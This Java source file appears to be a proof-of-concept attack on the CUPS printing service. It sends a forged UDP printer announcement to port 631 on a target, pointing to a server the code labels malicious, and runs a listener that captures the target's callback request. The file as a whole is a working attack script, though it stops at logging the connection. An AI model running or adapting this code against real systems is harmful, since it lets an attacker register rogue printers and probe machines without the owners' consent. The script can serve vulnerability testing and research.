package com.fresco;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.ServerSocket;

public class Cups {

	public static String HOST_TARGET = "localhost";
	public static int PORT_TARGET = 631;
	public static String HOST_MALICIOUS = "localhost";
	public static int PORT_MALICIOUS = 6789;
	public static String PRINTER_LOCATION = "\"Office HQ\"";
	public static String PRINTER_INFO = "\"Printer\"";

	public static int CRLF = 218762506;// '\r\n\r\n'

	public static void main(String[] args) throws IOException {

		Thread.ofPlatform().start(() -> createServer());

		try (var socketUDP = new DatagramSocket()) {
			var message = "0 3 http://%s:%d/printers/myprinter %s %s".formatted(HOST_MALICIOUS, PORT_MALICIOUS,
					PRINTER_LOCATION, PRINTER_INFO);
			var buffer = message.getBytes();
			var ipTarget = InetAddress.getByName(HOST_TARGET);
			var req = new DatagramPacket(buffer, buffer.length, ipTarget, PORT_TARGET);
			System.out.println("Send message");
			socketUDP.send(req);
		}
	}

	public static void createServer() {
		System.out.println("Init server");
		try (var server = new ServerSocket(PORT_MALICIOUS)) {
			try (var client = server.accept()) {
				var is = client.getInputStream();
				var request = new ByteArrayOutputStream();
				var end = 0;
				for (var b = is.read(); b != -1; b = is.read()) {
					request.write(b);
					end <<= 8;
					end |= b;
					if (end == CRLF) {
						break;
					}
				}
				System.out.println(request.toString());
			}
		} catch (IOException e) {
			System.err.println(e.getMessage());
		}
	}
}

